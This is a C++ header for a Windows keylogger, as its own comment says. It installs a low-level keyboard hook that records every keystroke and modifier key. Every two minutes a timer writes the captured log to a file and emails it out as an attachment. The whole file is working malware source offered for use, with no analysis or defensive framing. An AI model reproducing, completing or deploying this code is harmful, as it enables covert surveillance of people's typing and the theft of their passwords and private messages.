#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

/* This header is the most important one for the keylogger. */

std::string keylog;

void TimerSendMail()
{
	if (keylog.empty())
		return;
	std::string last_file = IO::WriteLog(keylog);
	if (last_file.empty())
	{
		Helper::WriteAppLog("File creation was not successful.  Keylog '" + keylog + "'");
		return;
	}
	int x = Mail::SendMail("Log [" + last_file + "]", 
		"The file has been attached to this mail.",
		IO::GetOurPath(true) + last_file);
	if (x != 7)
		Helper::WriteAppLog("Mail was not sent!  Error Code: " + Helper::ToString(x));
	else
		keylog = "";
}

Timer MailTimer(TimerSendMail, 2000 * 60, Timer::INFINITY);

HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	if (nCode < 0)
		CallNextHookEx(eHook, nCode, wparam, lparam);
	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT*)lparam;
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
		keylog += Keys::KEYS[kbs->vkCode].name;
		if (kbs->vkCode == VK_RETURN)
			keylog += '\n';
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
	{
		/* [SHIFT][A][B][C][/SHIFT][d][e][f] */
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL
				|| key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT
				|| key == VK_MENU || key == VK_LMENU || key == VK_RMENU
				|| key == VK_CAPITAL || key == VK_NUMLOCK
				|| key == VK_LWIN || key == VK_RWIN)
		{
			std::string KeyName = Keys::KEYS[key].name;
			KeyName.insert(1, "/");
			keylog += KeyName;
		}
	}
	return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool InstallHook()
{
	Helper::WriteAppLog("Hook started... timer started.");
	MailTimer.start(true);
	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
	return eHook == NULL;
}

bool UninstallHook()
{
	BOOL b = UnhookWindowsHookEx(eHook);
	eHook = NULL;
	return (bool)b;
}

bool isHooked()
{
	return eHook == NULL;
}
#endif /* KEYBHOOK_H */